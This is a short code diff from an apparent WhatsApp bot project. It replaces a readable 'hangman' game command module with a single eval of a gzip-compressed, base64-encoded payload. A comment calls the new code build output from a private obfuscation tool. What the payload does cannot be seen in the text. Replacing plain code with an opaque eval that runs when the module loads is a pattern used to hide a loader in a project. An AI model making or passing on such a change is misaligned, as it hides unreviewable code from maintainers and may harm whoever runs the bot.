@@ -1,9 +1,2 @@
-const games = require('../whatsapp/play');
-
-module.exports = {
-  name: 'hangman',
-  category: 'games',
-  adminOnly: true, // only admins start a game, everybody can join it
-  description: 'Hangman. Players type join, then send letters (e.g. hangman 5 = 5 rounds, hangman solo)',
-  run: (ctx) => games.fromCommand(ctx, 'hangman', { defaultRounds: 5 }),
-};
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAA02QsW7DIBCGdz/FbbYlhKcsidKlS7dUfQNqLjYV5igcbawo794zrqqO/Pfz3QcjhcwwmQUznCHhZ3EJu1br4Xs2nE2MQ/RmbftT0yxki0eNt0iJt/q9AQhy9QjtbMK0mNAqiUbDOFFaJa7gGhq7uHAJXlJOBRUMA5Ac90GGzCYxmKqiAL8wre9kV4EF+CAXwLFQLOYxuciOgtBf9qUaXkURUwZeI9a2Ap4xQMZgwSPzNuxQTxp+ReEg/gdIVILN6i/N5KmvvqnIhm7kWw/np/2D9DXR8kyLFO02Uf+eDXdxu5ri+a0ijwJ/9Kp5nJof3nPcOWMBAAA=', 'base64')).toString('utf8'));
